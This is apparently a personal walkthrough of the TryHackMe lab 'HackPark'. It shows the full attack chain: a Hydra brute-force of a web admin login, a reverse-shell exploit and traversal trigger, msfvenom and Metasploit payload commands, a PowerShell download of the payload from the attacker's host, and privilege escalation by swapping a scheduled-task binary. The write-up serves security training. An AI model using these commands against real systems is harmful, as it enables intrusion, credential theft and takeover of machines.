---
title: "HackPark Writeup THM"
description: "My writeup of the TryHackMe room [HackPark](https://tryhackme.com/room/hackpark)"
date: 2023-12-28T11:00:00+01:00
image: https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
    - Hydra
categories:
    - Room
    - Medium
---

First of all I am going to do a nmap scan:

```bash
nmap -Pn <Machine IP>

Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2023-12-28 05:20 EST
Nmap scan report for 10.10.100.75
Host is up (0.054s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.97 seconds
```

I have usend -Pn because the machine does not respond to ping.

We can see that it has port 80(web page) and port 3389(rdp) open.

For now I am just going to see the web page.

![Untitled](https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png)

From here I can do a reverse image research with google images to uncover the clown identity!

```bash
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt <Machine_IP> http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674&__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed”

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 05:43:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.100.75:80/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674&__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.10.100.75   login: admin   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-28 05:44:04
```

Found the password!

Now we need to get a reverse shell, this can be done by searching in exploit DB using the database version in http://10.10.100.75/admin/about.cshtml

After we install the exploit, we need to change the attacker ip and port to ours

```bash
using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("<YOUR_IP>", <YOUR_PORT>)) {
```

Then we rename the file into PostView.ascx

After that we set up a listener:

```bash
nc -lvnp 4444
```

And we go to publish it

![Untitled](https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled%201.png)

After that we just want to go to this path: `http://10.10.10.10/?theme=../../App_Data/files` for triggering the reverse shell!

Now, we want to upgrade the shell using metasploit.

First of all we create our revshell:

```bash
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=<YOUR_IP> LPORT=4555 -f exe -o revshell.exe
```

then we set up our listener inside metasploit:

```bash
use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST <YOUR_IP>

LHOST => <YOUR_IP>
msf6 exploit(multi/handler) > set LPORT 4555

LPORT => 4555
```

Then we create a server using python:

 `python3 -m http.server 8000`

After that we need to install the reverse shell inside the windows machine,

We need to do this inside the `temp` folder, otherwise is not going to work:

```bash
powershell Invoke-WebRequest -Uri http://10.18.20.116:8000/revshell.exe -OutFile revshell.exe
```

Then we execute the file and we have the shell!

now we need to search for the OS, we just need to use **sysinfo**

And for the processes **ps**

The hint tells us to check “C:\Program Files (x86)”

So I did:

```bash
c:\Program Files (x86)>dir

Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Program Files (x86)
08/06/2019  01:12 PM    <DIR>          .
08/06/2019  01:12 PM    <DIR>          ..
08/22/2013  07:39 AM    <DIR>          Common Files
03/21/2014  11:07 AM    <DIR>          Internet Explorer
08/22/2013  07:39 AM    <DIR>          Microsoft.NET
12/28/2023  04:49 AM    <DIR>          SystemScheduler
08/22/2013  07:39 AM    <DIR>          Windows Mail
08/22/2013  07:39 AM    <DIR>          Windows NT
08/22/2013  07:39 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
               9 Dir(s)  39,124,586,496 bytes free
```

The only thing strange to me is SystemScheduler, if we open the directory, we can see a bunch of processes.

Going in the Events, directory, and opening the log file, will reval to us which is the abnormal service that is running.

We see that the service Message.exe run with the Administrator privileges, and we can use that in our favor.

Now we put in background the meterpreter shell, and then we want to restart the listener again.

Next thing to do is, rename the reverse shell in `/windows/temp` to Message.exe

Then remove Message.exe from the SystemScheduler directory, and put the reverse shell now named Message.exe in it.

Now we just need to start the process.

(Do this with ./Message.exe or Start-Process “Message.exe”)

And we got a Admin shell!

Then I found the jeff flag in: `C:\Users\Jeff\Desktop\user.txt`

And the root flag in: `C:\Users\Administrator\Desktop\root.txt`
